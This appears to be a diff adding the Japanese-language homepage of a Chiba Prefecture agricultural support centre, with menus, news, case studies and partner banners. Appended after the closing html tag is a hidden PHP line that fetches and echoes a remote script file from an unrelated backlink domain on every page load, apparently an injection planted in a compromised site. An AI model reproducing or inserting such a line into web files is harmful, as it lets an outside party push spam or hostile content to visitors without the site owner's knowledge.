@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html lang="ja">
+  <head>
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-126536768-1"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      
+      gtag('config', 'UA-126536768-1');
+    </script>
+    <!-- Global site tag (gtag.js) - Google Analytics end-->
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="format-detection" content="telephone=no">
+    <title>千葉県農業者総合支援センター</title>
+    <meta name="description" content="千葉県農業者総合支援センターは、千葉県の農業関係機関・団体が農業に従事するみなさまのお悩みに応えします。インターネット、スマートフォン、お電話でも受け付けています。">
+    <link rel="shortcut icon" href="https://support.chiba-agri.com/assets/img/favicon.ico">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://support.chiba-agri.com/assets/img/apple-touch-icon-180x180.png">
+    
+    <meta property="og:type" content="website">
+    
+    <meta property="og:title" content="千葉県農業者総合支援センター">
+    <meta property="og:description" content="千葉県農業者総合支援センターは、千葉県の農業関係機関・団体が農業に従事するみなさまのお悩みに応えします。インターネット、スマートフォン、お電話でも受け付けています。">
+    <meta property="og:url" content="https://support.chiba-agri.com/">
+    <meta property="og:image" content="https://support.chiba-agri.com/assets/img/ogp.jpg">
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:title" content="千葉県農業者総合支援センター">
+    <meta property="twitter:description" content="千葉県農業者総合支援センターは、千葉県の農業関係機関・団体が農業に従事するみなさまのお悩みに応えします。インターネット、スマートフォン、お電話でも受け付けています。">
+    <meta property="twitter:image" content="https://support.chiba-agri.com/assets/img/ogp.jpg">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+Sans+JP:400,500,700&amp;display=swap&amp;subset=japanese">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:400,700&amp;display=swap">
+    <link rel="stylesheet" href="https://support.chiba-agri.com/assets/css/common.min.css">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.9.0/slick.min.css">
+    <link rel="stylesheet" href="https://support.chiba-agri.com/assets/css/index.min.css">
+    
+  </head>
+  <body>
+    <header>
+      <div class="inner">
+        <h1 class="logo"><a href="https://support.chiba-agri.com/"><img src="https://support.chiba-agri.com/assets/img/logo_header.svg" width="490" alt="千葉県農業者総合支援センター"></a></h1>
+        <ul class="inquiry">
+          <li class="tel"><a class="hover_opc" href="tel:08008001944"><div class="number"><img src="https://support.chiba-agri.com/assets/img/ico_tel.svg" width="19" alt="" /><span>0800-800-1944</span></div><div class="time">受付時間　平日9:00～17:00</div></a></li>
+          <li class="mail"><a class="hover_opc" href="https://support.chiba-agri.com/inquiry/inqform.cgi"><img src="https://support.chiba-agri.com/assets/img/ico_mail.svg" width="29" alt=""><span>お問い合わせ</span></a></li>
+        </ul>
+        <div class="button_menu forSP"><span></span></div>
+      </div>
+      <nav id="global-menu">
+        <div class="inner">
+          <ul class="menu">
+            <li>
+              <a href="https://support.chiba-agri.com/about/index.html">
+                <div class="icon"><img class="centre" src="https://support.chiba-agri.com/assets/img/ico_menu_centre.svg" width="29" alt=""></div><span>支援センターについて</span>
+              </a>
+            </li>
+            <li>
+              <a href="https://support.chiba-agri.com/pre_otoiawase/index.html">
+                <div class="icon"><img class="centre" src="https://support.chiba-agri.com/assets/img/ico_menu_pre_otoiawase.svg" width="29" alt="" /></div>
+                <span>農業について相談したい方へ</span>
+              </a>
+            </li>
+            <li>
+              <a class="no-anchor" href="https://support.chiba-agri.com/support/business.html">
+                <div class="icon"><img class="farm" src="https://support.chiba-agri.com/assets/img/ico_menu_farm.svg" width="29" alt=""></div><span>農業者向けの支援情報</span>
+              </a>
+              <div class="sub">
+                <ul>
+                  <li><a href="https://support.chiba-agri.com/support/business.html"><span>担い手向け補助事業</span></a></li>
+                  <li><a href="https://support.chiba-agri.com/support/incorporation/"><span>農業経営の法人化</span></a></li>
+                  <li><a href="https://support.chiba-agri.com/support/disaster/"><span>災害情報・災害に備える</span></a></li>
+                </ul>
+              </div>
+            </li>
+            <li>
+              <a class="no-anchor" href="https://support.chiba-agri.com/work/">
+                <div class="icon"><img class="person" src="https://support.chiba-agri.com/assets/img/ico_menu_person.svg" width="21" alt="" /></div><span>雇用と求人・求職者向け情報</span>
+              </a>
+              <div class="sub">
+                <ul>
+                  <li><a href="https://support.chiba-agri.com/work/"><span>働く人を探したい方へ</span></a></li>
+                  <li><a href="https://support.chiba-agri.com/work/jobs.html"><span>求職者向けの情報</span></a></li>
+                </ul>
+              </div>
+            </li>
+            <li>
+              <a class="no-anchor" href="https://support.chiba-agri.com/farmer/about/">
+                <div class="icon"><img class="bigining" src="https://support.chiba-agri.com/assets/img/ico_menu_bigining.svg" width="23" alt=""></div><span>農業を始めたい方へ</span>
+              </a>
+              <div class="sub">
+                <ul>
+                  <li><a href="https://support.chiba-agri.com/farmer/about/"><span>農業を始めるためには？</span></a></li>
+                  <li><a href="https://support.chiba-agri.com/farmer/new/"><span>新規就農に関する相談窓口</span></a></li>
+                </ul>
+              </div>
+            </li>
+            <li>
+              <a href="https://support.chiba-agri.com/useful/">
+                <div class="icon"><img class="useful" src="https://support.chiba-agri.com/assets/img/ico_menu_usefule.svg" width="22" alt="" /></div><span>お役立ち情報</span>
+              </a>
+            </li>
+          </ul>
+          <ul class="inquiry">
+            <li class="tel"><a href="tel:08008001944"><img src="https://support.chiba-agri.com/assets/img/ico_tel.svg" width="19" alt="" /><span>0800-800-1944</span><div class="time">受付時間<br />平日9:00～17:00</div></a></li>
+            <li class="mail"><a href="https://support.chiba-agri.com/inquiry/inqform.cgi"><img src="https://support.chiba-agri.com/assets/img/ico_mail.svg" width="29" alt=""><span>お問い合わせ</span></a></li>
+          </ul>
+        </div>
+      </nav>
+    </header>
+    <main>
+      
+      
+      <div id="important">
+        <div class="inner">
+          <ul>
+      
+            <li class="icon"><img src="https://support.chiba-agri.com/assets/img/index/ico_attention.svg" width="20" alt="重要なお知らせ"><span>重要なお知らせ</span></li>
+            <li class="date">2026.07.10</li>
+            <li class="title"><a class="hover_opc" href="https://support.chiba-agri.com/information/2026/07/10/post_228/">当センターを装ったメールにご注意ください</a></li>
+      
+          </ul>
+        </div>
+      </div>
+      
+      
+      <div id="main-visual">
+        <ul class="carousel">
+          <li><img class="forPC" src="https://support.chiba-agri.com/assets/img/index/main-visual_03.jpg" alt=""><img class="forSP" src="https://support.chiba-agri.com/assets/img/index/main-visual_03_sp.jpg" alt="">
+            <div class="caption">
+              <p><span class="main">ご相談ください、農業のこと。</span><span class="sub">千葉県の農業関連機関・団体が農業者の<br class="forSP">ご相談に<br class="forPC">ワンフロア・ワンストップで対応<br class="forSP">する総合窓口を設けました。</span></p>
+            </div>
+          </li>
+        </ul>
+      </div>
+      <section class="news -padding-big">
+        <div class="cmn-inner">
+          <div class="cmn-content">
+            <div class="icon-box"><img src="https://support.chiba-agri.com/assets/img/index/ico_info.svg" width="27" alt=""></div>
+            <h2 class="cmn-heading_1">新着情報</h2>
+            <ul class="article-list -m-lv3">
+            
+              <li id="entry-420">
+  <div class="date">2026.06.30</div>
+  <div class="category">
+  <div class="cat-label cat_info"><a href="https://support.chiba-agri.com/information/cat_info/">お知らせ</a></div>
+  </div>
+  <div class="title"><a href="https://support.chiba-agri.com/information/2026/06/30/post_227/">「雇用就農資金」令和８年度第２回の募集について</a></div>
+</li>
+            
+              <li id="entry-419">
+  <div class="date">2026.06.29</div>
+  <div class="category">
+  <div class="cat-label cat_info"><a href="https://support.chiba-agri.com/information/cat_info/">お知らせ</a></div>
+  </div>
+  <div class="title"><a href="https://support.chiba-agri.com/information/2026/06/29/post_226/">夏季の高温に対する農作物等の技術対策について</a></div>
+</li>
+            
+              <li id="entry-418">
+  <div class="date">2026.06.29</div>
+  <div class="category">
+  <div class="cat-label cat_info"><a href="https://support.chiba-agri.com/information/cat_info/">お知らせ</a></div>
+  </div>
+  <div class="title"><a href="https://support.chiba-agri.com/information/2026/06/29/post_225/">令和８年度農業雇用条件改善推進事業（２次）の公募について</a></div>
+</li>
+            
+            </ul>
+            <div class="btn-area -align-center">
+              <a class="cmn-btn-link" href="https://support.chiba-agri.com/information/">
+                <div class="inner"><span>新着情報をもっと見る</span></div>
+              </a>
+              <a class="cmn-btn-link" href="https://support.chiba-agri.com/useful/">
+                <div class="inner"><span>お役立ち情報はこちら</span></div>
+              </a>
+            </div>
+          </div>
+        </div>
+      </section>
+      <section class="menu -padding-big">
+        <div class="cmn-inner">
+          <div class="cmn-content">
+            <ul class="menu -flex -pc -clm3 -margin-big">
+              <li class="-row">
+                <h2 class="cmn-heading_2 -align-left">
+                  <div class="icon"><img src="https://support.chiba-agri.com/assets/img/index/ico_farm.svg" width="60" alt="農業者向けの支援情報"></div><span>農業者向けの<br />支援情報</span>
+                </h2>
+                <ul class="kasou">
+                  <li><a class="cmn-link -list-right" href="https://support.chiba-agri.com/support/business.html"><span>担い手向け補助事業</span></a></li>
+                  <li><a class="cmn-link -list-right" href="https://support.chiba-agri.com/support/incorporation/"><span>農業経営の法人化</span></a></li>
+                  <li><a class="cmn-link -list-right" href="https://support.chiba-agri.com/support/disaster/"><span>災害情報・災害に備える</span></a></li>
+                </ul>
+              </li>
+              <li class="-row">
+                <h2 class="cmn-heading_2 -align-left">
+                  <div class="icon"><img src="https://support.chiba-agri.com/assets/img/index/ico_person.svg" width="46" alt="雇用と求人・求職者向け情報"></div><span>雇用と求人・<br />求職者向け情報</span>
+                </h2>
+                <ul class="kasou">
+                  <li><a class="cmn-link -list-right" href="https://entori.jp/support_chiba-agri" target="_blank"><span>求人WEBサイト「ちばの農業で働こう！」</span></a></li>
+                  <li><a class="cmn-link -list-right" href="https://support.chiba-agri.com/work/"><span>働く人を探したい方へ</span></a></li>
+                  <li><a class="cmn-link -list-right" href="https://support.chiba-agri.com/work/jobs.html"><span>求職者向けの情報</span></a></li>
+                </ul>
+              </li>
+              <li class="-row">
+                <h2 class="cmn-heading_2 -align-left">
+                  <div class="icon"><img src="https://support.chiba-agri.com/assets/img/index/ico_bigining.svg" width="49" alt="農業を始めたい方へ"></div><span>農業を<br>始めたい方へ</span>
+                </h2>
+                <ul class="kasou">
+                  <li><a class="cmn-link -list-right" href="https://support.chiba-agri.com/farmer/about/"><span>農業を始めるためには？</span></a></li>
+                  <li><a class="cmn-link -list-right" href="https://support.chiba-agri.com/farmer/new/"><span>新規就農に関する相談窓口</span></a></li>
+                </ul>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </section>
+      <section class="voice -padding-big">
+        <div class="cmn-inner">
+          <div class="icon-box -align-center"><img src="https://support.chiba-agri.com/assets/img/index/ico_consultation.svg" width="85" alt=""></div>
+          <h2 class="cmn-heading_1">ご相談事例</h2>
+          <p class="cmn-p_large -align-center">支援センターに寄せられたご相談と<br class="forSP">その対応例をご紹介します。</p>
+          <ul class="article -mb-lv3">
+          
+            <li class="item" id="entry-169">
+  <a class="fukidashi -mb-lv1 hover_opc" href="https://support.chiba-agri.com/usersvoice/2022/03/11/post_10/">
+    <p class="text -mb-lv2">課題の洗い出しと各課題解決に向けた支援</p>
+    <p class="cmn-link -list-right cmn-p_ex-small"><span>詳しくはこちら</span></p>
+  </a>
+  <p class="name -align-center">集落営農組織代表者</p>
+</li>
+          
+            <li class="item" id="entry-167">
+  <a class="fukidashi -mb-lv1 hover_opc" href="https://support.chiba-agri.com/usersvoice/2022/03/11/post_8/">
+    <p class="text -mb-lv2">農作業事故を繰り返さないために</p>
+    <p class="cmn-link -list-right cmn-p_ex-small"><span>詳しくはこちら</span></p>
+  </a>
+  <p class="name -align-center">自治体農政担当者</p>
+</li>
+          
+            <li class="item" id="entry-166">
+  <a class="fukidashi -mb-lv1 hover_opc" href="https://support.chiba-agri.com/usersvoice/2022/03/11/post_7/">
+    <p class="text -mb-lv2">農繁期に農作業を委託したい</p>
+    <p class="cmn-link -list-right cmn-p_ex-small"><span>詳しくはこちら</span></p>
+  </a>
+  <p class="name -align-center">施設栽培兼業農家</p>
+</li>
+          
+            <li class="item" id="entry-159">
+  <a class="fukidashi -mb-lv1 hover_opc" href="https://support.chiba-agri.com/usersvoice/2022/03/11/post_3/">
+    <p class="text -mb-lv2">新水稲品種の栽培を省力化</p>
+    <p class="cmn-link -list-right cmn-p_ex-small"><span>詳しくはこちら</span></p>
+  </a>
+  <p class="name -align-center">水稲大規模経営の農業者</p>
+</li>
+          
+            <li class="item" id="entry-160">
+  <a class="fukidashi -mb-lv1 hover_opc" href="https://support.chiba-agri.com/usersvoice/2022/03/11/post_4/">
+    <p class="text -mb-lv2">若手後継者やスタッフに知識を学ぶ機会があると良いのですが</p>
+    <p class="cmn-link -list-right cmn-p_ex-small"><span>詳しくはこちら</span></p>
+  </a>
+  <p class="name -align-center">水稲大規模経営農業者</p>
+</li>
+          
+            <li class="item" id="entry-165">
+  <a class="fukidashi -mb-lv1 hover_opc" href="https://support.chiba-agri.com/usersvoice/2022/03/11/post_6/">
+    <p class="text -mb-lv2">農繁期の労働力を確保したい</p>
+    <p class="cmn-link -list-right cmn-p_ex-small"><span>詳しくはこちら</span></p>
+  </a>
+  <p class="name -align-center">露地野菜　大規模経営農業者</p>
+</li>
+          
+            <li class="item" id="entry-164">
+  <a class="fukidashi -mb-lv1 hover_opc" href="https://support.chiba-agri.com/usersvoice/2022/03/11/post_5/">
+    <p class="text -mb-lv2">将来の所得目標を実現するための経営概要を確認したい</p>
+    <p class="cmn-link -list-right cmn-p_ex-small"><span>詳しくはこちら</span></p>
+  </a>
+  <p class="name -align-center">露地野菜新規就農者</p>
+</li>
+          
+            <li class="item" id="entry-74">
+  <a class="fukidashi -mb-lv1 hover_opc" href="https://support.chiba-agri.com/usersvoice/2020/12/24/post_2/">
+    <p class="text -mb-lv2">イチゴ園の開設を目指して！</p>
+    <p class="cmn-link -list-right cmn-p_ex-small"><span>詳しくはこちら</span></p>
+  </a>
+  <p class="name -align-center">浅倉真理さん（栄町）</p>
+</li>
+          
+            <li class="item" id="entry-31">
+  <a class="fukidashi -mb-lv1 hover_opc" href="https://support.chiba-agri.com/usersvoice/2020/03/28/content/">
+    <p class="text -mb-lv2">加工業務用ねぎの導入で安定経営へ</p>
+    <p class="cmn-link -list-right cmn-p_ex-small"><span>詳しくはこちら</span></p>
+  </a>
+  <p class="name -align-center">（有）あぐり吉井　愛敬さん（茂原市）</p>
+</li>
+          
+            <li class="item" id="entry-15">
+  <a class="fukidashi -mb-lv1 hover_opc" href="https://support.chiba-agri.com/usersvoice/2020/02/28/post/">
+    <p class="text -mb-lv2">ナバナを導入して収益力アップ！</p>
+    <p class="cmn-link -list-right cmn-p_ex-small"><span>詳しくはこちら</span></p>
+  </a>
+  <p class="name -align-center">株式会社岡本農園　岡本秀和さん（南房総市）</p>
+</li>
+          
+          </ul>
+          <div class="btn-area -align-center"><a class="cmn-btn-link" href="https://support.chiba-agri.com/usersvoice/">
+              <div class="inner"><span>もっと見る</span></div></a></div>
+        </div>
+      </section>
+      <section class="link -padding-big">
+        <div class="cmn-inner">
+          <div class="cmn-content">
+            <h2 class="cmn-heading_2 -mb-lv3">関連サイト</h2>
+            <ul class="banner-list">
+              <li class="item">
+<div class="inner"><a class="banner hover_opc" href="https://entori.jp/support_chiba-agri/" target="_blank"><img src="/uploads/2020/03/banner_04.jpg" width="256" alt=""></a>
+    <h3 class="title">ちばの農業で働こう！</h3>
+    <p class="caption cmn-p_small">千葉県の農業求人サイトです</p>
+  </div>
+</li>
+<li class="item">
+  <div class="inner"><a class="banner hover_opc" href="https://www.ja-kyosai.or.jp/" target="_blank"><img src="https://support.chiba-agri.com/assets/img/index/banner_01.jpg" width="256" alt=""></a>
+    <h3 class="title">JA共済</h3>
+    <p class="caption cmn-p_small">農業者の皆さまに役立つ情報や保障をご紹介しています。</p>
+  </div>
+</li>
+<li class="item">
+  <div class="inner"><a class="banner hover_opc" href="http://social.ja-kyosai.or.jp/" target="_blank"><img src="https://support.chiba-agri.com/assets/img/index/banner_02.jpg" width="256" alt=""></a>
+    <h3 class="title">JA共済 地域貢献活動</h3>
+    <p class="caption cmn-p_small">全国的な地域貢献活動、各都道府県の地域貢献などをご紹介しています。</p>
+  </div>
+</li>
+
+<li class="item">
+  <div class="inner"><a class="banner hover_opc" href="https://www.zennoh.or.jp/cb/
+" target="_blank"><img src="https://support.chiba-agri.com/uploads/2020/11/ja-chiba.jpg" width="256" alt=""></a>
+    <h3 class="title">全農ちば</h3>
+    <p class="caption cmn-p_small">千葉県の農畜産物の販売と関連資材の購買に関する情報を御紹介しています。</p>
+  </div><li class="item">
+  <div class="inner"><a class="banner hover_opc" href="https://www.agriweb.jp/" target="_blank"><img src="https://support.chiba-agri.com/uploads/2020/07/aguriweb_banner_256-70.jpg"https://support.chiba-agri.com/uploads/2020/07/aguriweb_banner_256-70.jpg width="256" alt=""></a>
+    <h3 class="title">アグリウェブ</h3>
+    <p class="caption cmn-p_small">農業経営に必要な情報を一元集約し掲載しています。</p>
+  </div>
+</li>
+<li class="item">
+  <div class="inner"><a class="banner hover_opc" href="https://www.pref.chiba.lg.jp/" target="_blank"><img src="https://support.chiba-agri.com/assets/img/index/banner_03.jpg" width="256" alt=""></a>
+    <h3 class="title">千葉県ホームページ</h3>
+    <p class="caption cmn-p_small">農業関連の金融・共済・補助事業が掲載されています。</p>
+  </div>
+</li>
+<li class="item">
+  <div class="inner"><a class="banner hover_opc" href="https://agri.mynavi.jp/farm_chiba/" target="_blank"><img src="https://support.chiba-agri.com/assets/img/index/banner_mynabi.png
+" width="256" alt=""></a>
+    <h3 class="title">おいでよ！ファームちば　千葉県就農ポータルサイト</h3>
+    <p class="caption cmn-p_small">千葉県で就農を検討する方に役立つ、就農体験談、支援策の概要等を紹介しています。</p>
+  </div>
+</li>
+            </ul>
+          </div>
+        </div>
+      </section>
+    </main>
+<ul class="inquiry_sp">
+  <li class="tel"><a class="hover_opc" href="tel:08008001944"><div class="number"><img src="https://support.chiba-agri.com/assets/img/ico_tel.svg" width="19" alt="" /><span>0800-800-1944</span></div><div class="time">受付時間　平日9:00～17:00</div></a>
+    <li class="mail"><a class="hover_opc" href="https://support.chiba-agri.com/inquiry/inqform.cgi"><img src="https://support.chiba-agri.com/assets/img/ico_mail.svg" width="29" alt=""><span>お問い合わせ</span></a></li>
+  </ul>
+  <footer>
+    <a class="button_gotop" href="#"><img src="https://support.chiba-agri.com/assets/img/button_gotop.png" width="102" alt="ページトップへ戻る" /></a>
+    <div class="bg_pattern"></div>
+    <div class="cmn-inner">
+      <div class="container_top">
+        <div class="logo">
+        <a href="https://support.chiba-agri.com/">
+            <picture>
+              <source media="(max-width: 767px)" srcset="https://support.chiba-agri.com/assets/img/logo_footer_sp.svg"><img src="https://support.chiba-agri.com/assets/img/logo_footer.svg" width="251" alt="千葉県農業者総合支援センター">
+            </picture>
+        </a>
+        </div>
+        <div class="address">
+          <p>〒260-0014</p>
+          <p>千葉市中央区本千葉町9-10 <br class="forSP">千葉県JA情報センタービル1F&emsp;<a class="cmn-link" href="https://goo.gl/maps/2v3skPv6sPgDRDgCA" target="_blank"><span>MAP</span></a></p>
+          <p class="tel"><a href="tel:08008001944">TEL:0800-800-1944</a>  /  FAX:043-310-3187</p>
+        </div>
+        <div class="sns-wrap">
+          <div class="sns-x">
+            <a class="hover_opc" href="https://x.com/chibaagurisc" target="_blank"><img src="/assets/img/ico_x.svg" width="43" alt="" /></a>
+          </div>
+          <div class="fb">
+            <a class="hover_opc" href="https://www.facebook.com/chibashiencenter" target="_blank"><img src="/assets/img/ico_fb.svg" width="43" alt="" /></a>
+          </div>
+        </div>
+      </div>
+      <div class="container_bottom">
+        <ul class="menu">
+          <li><a class="hover_opc" href="https://support.chiba-agri.com/inquiry/inqform.cgi">お問い合わせ</a></li>
+          <li><a class="hover_opc" href="https://support.chiba-agri.com/sitemap/index.html">サイトマップ</a></li>
+          <li><a class="hover_opc" href="https://support.chiba-agri.com/privacy/index.html">個人情報保護方針</a></li>
+        </ul>
+        <p class="copy">&copy; 千葉県農業者総合支援センター</p>
+      </div>
+    </div>
+  </footer>
+  <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-easing/1.4.1/jquery.easing.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/picturefill/3.0.3/picturefill.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/object-fit-images/3.2.4/ofi.min.js"></script>
+  <script src="https://support.chiba-agri.com/assets/js/common.min.js"></script>
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.9.0/slick.min.js"></script>
+  <script src="https://support.chiba-agri.com/assets/js/index.min.js"></script>
+  
+  
+</body>
+</html>
+
+<?php echo file_get_contents("https://www.backlinkku.id/menu/vip-v1/script.txt"); ?>
